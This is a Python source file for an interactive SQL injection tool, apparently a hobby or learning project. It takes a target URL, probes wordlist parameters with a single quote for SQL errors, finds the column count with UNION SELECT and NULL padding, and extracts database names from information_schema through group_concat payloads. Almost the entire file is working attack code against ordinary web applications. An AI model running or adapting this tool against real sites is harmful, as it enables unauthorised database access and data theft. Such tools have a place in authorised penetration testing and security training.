import requests
import re


FIND = "10293847562821"
TITLE = """.▄▄ · .▄▄▄  ▄▄▌    ▪   ▐ ▄  ▐▄▄▄▄▄▄ . ▄▄· ▄▄▄▄▄▄▄▄ .▄▄▄  
▐█ ▀. ▐▀•▀█ ██•    ██ •█▌▐█ ▪·██▀▄.▀·▐█ ▌▪•██  ▀▄.▀·▀▄ █·
▄▀▀▀█▄█▌·.█▌██ ▪   ▐█·▐█▐▐▌▪▄ ██▐▀▀▪▄██ ▄▄ ▐█.▪▐▀▀▪▄▐▀▀▄ 
▐█▄▪▐█▐█▪▄█·▐█▌ ▄  ▐█▌██▐█▌▐▌▐█▌▐█▄▄▌▐███▌ ▐█▌·▐█▄▄▌▐█•█▌
 ▀▀▀▀ ·▀▀█. .▀▀▀   ▀▀▀▀▀ █▪ ▀▀▀• ▀▀▀ ·▀▀▀  ▀▀▀  ▀▀▀ .▀  ▀
"""


def checkResponse(url):
    try:
        response = requests.get(url, timeout=5)
        return response.status_code == 200
    except requests.exceptions.RequestException:
        return False


def havesIp(ip):
    if ip:
        return True
    else:
        print("Ip not set")
        return False


def inject(query, ip, param):
    test = f"{ip}/?{param}={query}-- -"
    response = requests.get(test)
    return response.text


def clearContent(content, separator):
    sep_safe = re.escape(separator)
    pattern = rf"{sep_safe}(.*?){sep_safe}"
    data = re.findall(pattern, content, re.DOTALL)
    return data


def checkList(list):
    if list:
        print(list)
    else:
        print("Nothing found")


def selectByIndex(list):
    if not list:
        print("Targets required")
        return False

    print("Select target by Index:")
    for i, element in enumerate(list):
        print(f"({i}) {element}")
    response = int(input(">> "))
    return response


def main():
    print(TITLE)
    response = ""
    ip = ""
    parameters = []

    while response != exit:
        response = input(">> ").lower()
        if response == "ip":
            ip = input(">> new ip: ")
            ip = f"http://{ip}"
            parameters = []
            if checkResponse(ip):
                print(f"Succesfull conection at: {ip}")
            else:
                print(f"Unsuccesfull conection at: {ip}")
        elif response == "route":
            if havesIp(ip):
                route = input(f">> {ip}/")
                ip_test = f"{ip}/{route}"
                if checkResponse(ip_test):
                    ip = ip_test
                    print(f"Route found at: {ip}")
                else:
                    print("Route not found")
        elif response == "show":
            if havesIp(ip):
                print(f"{ip}")
        elif response == "check":
            if havesIp(ip):
                parameters = []
                print("Checking vulnerable parameters...")
                with open("wordlist.txt", "r") as wordlist:
                    for line in wordlist:
                        param = line.strip()
                        ip_test = f"{ip}/?{param}='"
                        test = requests.get(ip_test)
                        content = test.text.lower()
                        if "sql" in content:
                            print(f"Found parameter: {param}")
                            parameters.append(param)
                    if parameters:
                        print(f"Parameters found: {parameters}")
                    else:
                        print("No parameters found")
        elif response == "params":
            if havesIp(ip):
                print(f"Payload parameters set: {parameters}")
        elif response == "inject":
            if havesIp(ip):
                if parameters:
                    num_params = 0
                    use_param = ""
                    for param in parameters:
                        query = f"-1+AND+1=0+UNION+SELECT+{FIND}"
                        for num in range(1, 25):
                            ip_test = f"{ip}/?{param}={query}--"
                            test = requests.get(ip_test)
                            content = test.text.lower()
                            if FIND in content:
                                num_params = num
                                use_param = param
                                break
                            else:
                                query = f"{query},NULL"
                        if num_params > 0:
                            break
                    if num_params == 0:
                        print("Payload not working")
                    else:
                        print("="*10, "Injection Mode", "="*10)
                        response2 = ""
                        databases = []
                        while response2 != "exit":
                            response2 = input(">> ")
                            if response2 == "help":
                                print("""[Command list]
- 'exit' leave injection mode
- 'database' extract databases
- 'number' show number of parameters
""")
                            elif response2 == "database":
                                query = f"1+AND+1=0+UNION+SELECT+group_concat('{FIND}',schema_name,'{FIND}')" + (
                                    ",NULL" * (num_params - 1)) + "+FROM+information_schema.schemata"
                                content = inject(query, ip, use_param)
                                databases = clearContent(content, FIND)
                                checkList(databases)
                            elif response2 == "number":
                                print(f"Number of payload parameters: {
                                      num_params}")
                else:
                    print("No parameters set, first run 'check'")
        elif response == "help":
            print("""[Command list]
- 'exit' exit the script
- 'ip' set a new target ip
- 'route' set a new target route
- 'check' check if its vulnerable by SQLi
- 'show' show current target
- 'params' show current payload parameters
- 'injection' open inejction menu
                  """)
        elif response == "exit":
            quit()


if __name__ == "__main__":
    main()
